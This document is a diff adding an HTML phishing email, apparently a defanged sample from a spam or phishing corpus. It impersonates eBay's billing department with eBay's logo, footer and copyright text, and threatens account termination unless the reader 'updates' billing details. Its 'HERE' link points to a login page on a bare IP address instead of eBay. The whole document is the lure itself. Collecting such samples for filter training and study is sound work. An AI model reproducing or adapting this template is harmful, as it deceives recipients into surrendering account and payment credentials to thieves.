@@ -1,0 +1,72 @@
+<html>
+<BODY bgColor=#ffffff>
+<img src="http://pics.ebay.com/aw/pics/homepage/v2/logo_171x102.gif">
+<br>
+Dear Valued Ebay Member,
+<br>
+<br>
+<br>
+
+It has come to our attention that your Ebay Billing information records needs updated for the year 2006. This requires you to update your billing information.
+<br>
+If you could please take 5-10 minutes out of your online experience and update your billing records. You will not run into any future problems <br>with your Ebay online services. However, failure to update your records will result in account termination. If you would like to keep your account <br>please update your ebay account as soon as possible. Once you have updated your account records, your ebay session will not be interrupted <br>and will continue as normal. Failure to update will result in cancellation of service, Terms of Service (TOS) violations or future billing problems.
+<br>
+<br>
+<br>
+Please Update <a href=http://61.66.133.174/ebay/login/>HERE</A>
+
+<br>
+<br>
+<br>
+<br>
+Thank you for your time.
+<br>Augustus Crane
+<br>Ebay Billing Dept team.
+
+<br>
+<br>
+<!-- begin footer -->
+<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0" WIDTH="600">
+	<TR>
+		<TD COLSPAN="2"><CENTER><font size="-1">
+			<BR><HR WIDTH="500">
+			<br>
+			<A HREF="http://www2.ebay.com/aw/marketing.shtml">Announcements</A> &nbsp;|&nbsp;
+			<A HREF="http://cgi4.ebay.com/aw-cgi/eBayISAPI.dll?RegisterShow">Register</A> &nbsp;|&nbsp;
+			<A href="http://www.ebayorama.com">Shop eBay-o-rama</A> &nbsp;|&nbsp;
+			<A HREF="http://pages.ebay.com/help/confidence/hub.html">Safe Trading Tips</A>&nbsp;&nbsp;|&nbsp;&nbsp;<A HREF="http://pages.ebay.com/help/policies/hub.html">Policies</A> &nbsp;|&nbsp;
+			<A HREF="http://pages.ebay.com/services/forum/feedback.html">Feedback Forum</A>
+	<A NAME="text"><BR></A>
+	<A HREF="http://pages.ebay.com/community/aboutebay/index.html">About eBay</A> &nbsp;|&nbsp;
+			<A HREF="http://pages.ebay.com/index.html">Home</A> &nbsp;|&nbsp;
+			<A HREF="http://cgi1.ebay.com/aw-cgi/eBayISAPI.dll?MyEbayLogin">My eBay</A> &nbsp;|&nbsp;
+			<A HREF="http://pages.ebay.com/sitemap.html">Site Map</A>&nbsp;|&nbsp;<A HREF="http://pages.ebay.com/download/index.html">eBay Downloads</A>
+			<P><A HREF="http://pages.ebay.com/buy/index.html">Browse</A> &nbsp;|&nbsp;
+			<A HREF="http://cgi5.ebay.com/ws1/eBayISAPI.dll?ListItemForSale">Sell</A> &nbsp;|&nbsp;
+			<A HREF="http://pages.ebay.com/services/index.html">Services</A> &nbsp;|&nbsp;
+			<A HREF="http://pages.ebay.com/search/items/basicsearch.html">Search</A> &nbsp;|&nbsp;
+			<A HREF="http://pages.ebay.com/help/index_popup.html" target="helpwin" DEFANGED_onclick="return openHelpWindow(this.href);">Help</A> &nbsp;|&nbsp;
+			<A HREF="http://pages.ebay.com/community/index.html">Community</A>
+			<BR><BR>
+		</FONT></CENTER></TD>
+	</TR>
+	<TR>
+		<TD WIDTH="450" VALIGN="top" ALIGN="left"><font size="-1">Copyright &copy; 1995-2003 eBay Inc. All Rights Reserved.<BR>
+		Designated trademarks and brands are the property of their respective owners.<BR>
+		Use of this Web site constitutes acceptance of the eBay <A HREF="http://pages.ebay.com/help/policies/user-agreement.html" target="helpwin" DEFANGED_onclick="return openHelpWindow(this.href);">User Agreement</A> and <A HREF="http://pages.ebay.com/help/policies/privacy-policy.html" target="helpwin" DEFANGED_onclick="return openHelpWindow(this.href);">Privacy Policy</A>.</FONT></TD>
+		<TD WIDTH="150" VALIGN="top" ALIGN="right"><a href="http://pages.ebay.com/help/policies/privacy-policy.html" target="helpwin" DEFANGED_onclick="return openHelpWindow(this.href);"><IMG  SRC="http://pics.ebay.com/aw/pics/truste_button.gif" ALIGN="middle" WIDTH="116" HEIGHT="31" ALT="TrustE" BORDER=0></A></TD>
+	</TR>
+</TABLE>
+<DEFANGED_SCRIPT LANGUAGE="JavaScript">
+<!--
+var cbc, cbf;
+if (cbc){
+	writeFooter();
+	if (cbf){
+		fullCB();
+	}
+}
+//  -->
+</DEFANGED_SCRIPT>
+</BODY>
+</HTML>
